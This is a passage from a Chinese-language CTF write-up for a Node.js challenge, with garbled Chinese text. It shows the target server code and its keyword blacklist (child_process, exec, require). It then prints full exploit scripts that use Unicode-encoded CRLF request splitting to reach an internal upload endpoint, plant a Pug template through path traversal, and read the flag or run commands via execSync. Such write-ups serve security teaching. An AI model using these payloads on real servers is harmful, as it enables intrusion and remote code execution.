&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resps&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;search param &amp;#39;q&amp;#39; missing!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// urlencodeç»•è¿‡ å­—ç¬¦ä¸²æ‹¼æŽ¥ç»•è¿‡ unicodeç»•è¿‡
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8081&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Example app listening at http://%s:%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ‰ä¸Šé¢ä¸¤ä¸ªé¢˜çš„é“ºåž«ï¼Œè¿™ä¸ªä»£ç å°±ä¼šå¥½ç†è§£ä¸€äº›&lt;/p>
&lt;p>è¿™ä¸ªé¢˜æ”¹ç¼–çš„åœ°æ–¹åœ¨äºŽå¤šäº†ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œå¯ä»¥é€šè¿‡&lt;code>../&lt;/code>çš„mimetypeæ¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œpugæ¸²æŸ“ä¼šå€ŸåŠ©æˆ‘ä»¬ä¸Šä¼ çš„.pugæ¨¡æ¿ï¼Œåœ¨è¿™é‡ŒåŒ…å«flag.txt&lt;/p>
&lt;p>é€šè¿‡æŠ“åŒ…ä¿®æ”¹å†…å®¹æ¥åšpayload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">HTTP/1.1
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Host: amiz
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Connection: keep-alive
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/file_upload&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">amiz&lt;/span>
&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">266&lt;/span>
&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf&lt;/span>
&lt;span style="color:#111">Cache-control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">keep-alive&lt;/span>
------WebKitFormBoundary4RZFWBFQ4MBn61cf
Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
Content-Type: /../template
doctype html
html
head
style
include ../../../../../../../flag.txt
------WebKitFormBoundary4RZFWBFQ4MBn61cf--
GET /flag HTTP/1.1
Host: amiz
Connection: close
amiz:
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½¿ç”¨ä¸Šé¢æˆ‘ä»¬å·²ç»æž„é€ å¥½çš„é€šç”¨exp.pyæž„é€ payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://5214b607-8520-4572-9bfc-d289a0e0c4f8.node4.buuoj.cn:81/core?q=&amp;#39;&lt;/span>
&lt;span style="color:#111">SPACE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0120&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">CRLF&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u010d\u010a&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">SLASH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u012f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">DOUBLE_MARK&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0122&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">SINGLE_MARK&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0127&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;span style="color:#d88200">Content-Length: 266
&lt;/span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;span style="color:#d88200">Cache-control: no-cache
&lt;/span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
&lt;/span>&lt;span style="color:#d88200">Content-Type: /../template
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">doctype html
&lt;/span>&lt;span style="color:#d88200">html
&lt;/span>&lt;span style="color:#d88200"> head
&lt;/span>&lt;span style="color:#d88200"> style
&lt;/span>&lt;span style="color:#d88200"> include ../../../../../../../flag.txt
&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf--
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">GET /flag HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;span style="color:#d88200">Connection: close
&lt;/span>&lt;span style="color:#d88200">amiz: &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SPACE&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">CRLF&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SLASH&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">DOUBLE_MARK&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SINGLE_MARK&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133327186.png" alt="image-20211206133327186">&lt;/p>
&lt;p>æˆåŠŸå¾—åˆ°flagï¼Œæœ¬åœ°æŠ“åŒ…çœ‹ä¸€ä¸‹å…·ä½“æƒ…å†µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207011253660.png" alt="image-20211207011253660">&lt;/p>
&lt;p>åœ¨expä¸­æˆ‘ä»¬å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦åšäº†unicodeç¼–ç ï¼Œè¢«ç¼–ç çš„å­—ç¬¦åº”è¯¥åŒ…æ‹¬ä»¥ä¸‹è¿™äº›&lt;/p>
&lt;pre tabindex="0">&lt;code>! &amp;amp; ` ; + \ / &amp;quot; ' &amp;lt;SPACE&amp;gt; &amp;lt;CRLF&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133438315.png" alt="image-20211206133438315">&lt;/p>
&lt;p>ï¼ˆï¼ï¼ï¼æ³¨æ„ è¿™é‡Œå¾ˆå¯èƒ½æœ‰é—æ¼æˆ–è€…ä¸å¿…è¦çš„ è¯·æ ¹æ®å®žé™…æƒ…å†µä¿®æ”¹&lt;/p>
&lt;p>ä¸‹é¢æ˜¯å®Œå…¨ç¼–ç çš„exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;span style="color:#d88200">Content-Length: 266
&lt;/span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;span style="color:#d88200">Cache-control: no-cache
&lt;/span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
&lt;/span>&lt;span style="color:#d88200">Content-Type: ../template
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">doctype html
&lt;/span>&lt;span style="color:#d88200">html
&lt;/span>&lt;span style="color:#d88200"> head
&lt;/span>&lt;span style="color:#d88200"> style
&lt;/span>&lt;span style="color:#d88200"> include ../../../../../../../flag.txt
&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf--
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0xff&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://a4d0ae70-d877-43de-8158-ed2b3c8fcb75.node4.buuoj.cn:81/core?q=&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†ä¼šæž„é€ å‡ºè¿™ç§çŽ©æ„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133631155.png" alt="image-20211206133631155">&lt;/p>
&lt;p>å¦å¤–pugæ¨¡æ¿é™¤äº†åŒ…å«flag.txtä»¥å¤–è¿˜å¯ä»¥è·Ÿä¸Šé¢nullconçš„é¢˜ä¸€æ ·ç”¨curlè¯·æ±‚æ¥å¤–å¸¦flagï¼›ç¨å¾®ä¿®æ”¹ä¸€ä¸‹expå³å¯&lt;/p>
&lt;p>æ”¾ä¸€ä¸‹&lt;a href="https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game">å®˜æ–¹exp.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#111">payloadRaw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;x HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: localhost:8081
&lt;/span>&lt;span style="color:#d88200">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
&lt;/span>&lt;span style="color:#d88200">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
&lt;/span>&lt;span style="color:#d88200">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
&lt;/span>&lt;span style="color:#d88200">Accept-Encoding: gzip, deflate
&lt;/span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
&lt;/span>&lt;span style="color:#d88200">Content-Length: 6279
&lt;/span>&lt;span style="color:#d88200">Origin: http://localhost:8081
&lt;/span>&lt;span style="color:#d88200">Connection: close
&lt;/span>&lt;span style="color:#d88200">Referer: http://localhost:8081/?action=upload
&lt;/span>&lt;span style="color:#d88200">Upgrade-Insecure-Requests: 1
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">-----------------------------12837266501973088788260782942
&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;5am3_get_flag.pug&amp;#34;
&lt;/span>&lt;span style="color:#d88200">Content-Type: ../template
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">- global.process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;evalcmd&amp;#39;)
&lt;/span>&lt;span style="color:#d88200">-----------------------------12837266501973088788260782942--
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
